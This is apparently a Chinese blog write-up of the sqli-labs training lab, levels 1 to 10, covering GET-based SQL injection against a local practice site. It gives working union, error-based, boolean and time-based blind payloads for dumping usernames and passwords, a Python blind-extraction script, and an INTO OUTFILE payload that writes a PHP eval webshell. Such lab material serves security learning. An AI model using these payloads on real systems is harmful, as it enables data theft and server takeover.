# sqli-labs靶场(1)GET型


sqli-labs靶场精简记录1-10

<!--more-->

### Less-1 GET - Error based - Single quotes - String

基于错误的GET单引号字符型注入

vul

```
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
```

bypass

```
http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,2,3 --+
```

```
爆数据库
id=-1'union select 1,group_concat(schema_name),3 from information_schema.schemata--+

爆表名
id=-1'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+

爆字段名
id=-1'union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+

爆数据名
id=-1'union select 1,group_concat(username,password),3 from security.users--+
id=-1'union select 1,group_concat(username,password),3 from users--+
```



### Less-2GET - Error based - Intiger based

基于错误的GET整型注入

vul

```
 $sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
```

bypass

```
http://127.0.0.1/sqli-labs/Less-3/?id=-1 union select 1,2,3 --+
```

### Less-3 GET - Error based - Single quotes with twist string

基于错误的GET单引号变形字符型注入

vul

```
$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
```

bypass

```
http://127.0.0.1/sqli-labs/Less-3/?id=-1') union select 1,2,3 --+
```

### Less-4 GET - Error based - Double Quotes - String

基于错误的GET双引号字符型注入

vul

```
$id = '"' . $id . '"';
$sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1";
```

bypass

```
http://127.0.0.1/sqli-labs/Less-4/?id=-1") union select 1,2,3 --+
```

### Less-5 GET - Double Injection - Single Quotes - String

双注入GET单引号字符型注入

vul

```
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
...
	print_r(mysql_error());
```

payload

#### 基于报错注入

```
//判断数据库的长度
?id=1'and length((select database()))>9--+

//截取判断对应字符
//substr(a,b,c)a是要截取的字符串，b是截取的位置，c是截取的长度。
?id=1'and ascii(substr((select database()),1,1))=115--+

//判断所有表名字符长度
?id=1'and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))>13--+

//逐一判断表名
?id=1'and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))>99--+

//判断所有字段名的长度
?id=1'and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))>20--+

//逐一判断字段名
?id=1'and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,1))>99--+

//判断字段内容长度
?id=1' and length((select group_concat(username,password) from users))>109--+

//逐一检测内容
?id=1' and ascii(substr((select group_concat(username,password) from users),1,1))>50--+

```

#### 基于时间盲注

sleep()函数

```
id=1' and If(ascii(substr(database(),1,1))=115,1,sleep(5))-- #
当正确时无明显延迟,错误有明显延迟
```

benchmark () 函数

```
id=1' UNION SELECT (IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,ENCODE('MSG','by 5 seconds')),null)),2,3 FROM (select database() as current) as tb1-- #
```

script

```python
# coding:utf-8
import requests
import datetime
import time

# 获取数据库名长度


def database_len():
    for i in range(1, 10):
        url = "http://127.0.0.1/sqli-labs/Less-5/index.php"
        payload = " ?id=1' and if(length(database())>%s,sleep(1),0) --+" % i
        # print(url+payload+'%23')
        time1 = datetime.datetime.now()
        r = requests.get(url + payload)
        time2 = datetime.datetime.now()
        sec = (time2 - time1).seconds
        if sec >= 1:
            print(i)
        else:
            print(i)
            break
    print('database_len:', i)

#获取数据库名
def database_name():
    name = ''
    for j in range(1,9):
        for i in '0123456789abcdefghijklmnopqrstuvwxyz':
            url = "http://127.0.0.1/sqli-labs/Less-5/index.php"
            payload = "?id=1' and if(substr(database(),%d,1)='%s',sleep(3),1) --+" % (j,i)
            #print(url+payload)
            time1 = datetime.datetime.now()
            r = requests.get(url + payload)
            time2 = datetime.datetime.now()
            sec = (time2 - time1).seconds
            if sec >=3:
                name += i
                print(name)
                break
    print('database_name:', name)


if __name__ == '__main__':
    database_name()
```

#### xpath注入

```
mysql> updatexml(1,concat(0x5e,database(),0x5e),1);
ERROR 1105 (HY000): XPATH syntax error: '^security^'
```

payload

```
?id=1' and updatexml(1,concat(0x5e,(substr((select group_concat(username,0x7e,password) from users),1)),0x5e),1) --+
```

### Less-6 GET - Double Injection - Double Quotes - String

双注入GET双引号字符型注入

vul

```
$id=$_GET['id'];
...
$id = '"'.$id.'"';
...
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
...
	print_r(mysql_error());
```

bypass

```
?id=1"and length((select database()))>9--+
```

### Less-7 GET - Dump into outfile - String

导出文件GET字符型注入

vul

```
$id=$_GET['id'];
...
$sql="SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1";
```

bypass

```
?id=1')) and length((select database()))>9--+
```

但需要网站的绝对路径

```
//@@datadir输出数据库中数据的存放路径
?id=-1' union select 1,2,@@datadir--+
//得到Your Password:D:\phpstudy_pro\Extensions\MySQL5.7.26\data\
```

利用 into outfile 导出文件

```
//需要修改my.ini
secure_file_priv的值为null时,表示限制mysql不允许导入,导出
secure_file_priv的值为/tmp/,表示限制mysql的导入,导出只能发生在/tmp/目录下
secure_file_priv的值没有具体的值""时表示不对mysql的导入导出做出限制
```

将数据库里面的信息导出到文件中

```
?id=-1')) union select * from security.users into outfile "D:\\phpstudy_pro\\WWW\\other\\sqli-labs\\Less-7\\users.txt" --+
```

也可以写进webshell

```
?id=-1')) union select 1,2,"<?php @eval($_POST['aaa']);?>" into outfile "D:\\phpstudy_pro\\WWW\\other\\sqli-labs\\Less-7\\shell.php" --+
```

### Less-8 GET - Blind - Boolian Based - Single Quotes

布尔型单引号GET盲注

vul

```
$id=$_GET['id'];

$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
```

bypass

```
?id=1' and if(ascii(substr(database(),1,1))>1,sleep(5),sleep(1)) --+
```

### Less-9 GET - Blind - Time based. - Single Quotes 

基于时间的GET单引号盲注

bypass

```
?id=1' and if(ascii(substr(database(),1,1))>1,sleep(5),sleep(1)) --+
```

### Less-10 GET - Blind - Time based - double quotes

基于时间的双引号盲注

vul

```
$id=$_GET['id'];
$id = '"'.$id.'"';
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
```

bypass

```
?id=1" and if(ascii(substr(database(),1,1))>1,sleep(5),sleep(1)) --+
```

#### 盲注截取函数

mid()

```
mid(column_name,start,length)
column_nmae:需要提取的字符字段
start:规定开始的位置
length:要返回的字段数
mid(database(),1,1)>'a':查看数据库名的第一位
```

substr () 与 substring ()

```
substr()和substring()函数实现的功能是一样的
string substring(string,start,length)
string substr(string,start,length)
参数描述同mid参数,第一个为要处理的字符串,start为开始位置,length为截取的长度
```

left()

```
left()得到字符串左部指定个数的字符串
left(string,n)
string为要截取的字符串,n为长度
```

#### 编码函数

ord()

```
返回第一个字符的ascii码
判断database()的第一位ascii码是否大于114：
ord(mid(database(),1,1))>114
```

ascii()

```
将某个字符转换为 ascii 值
```


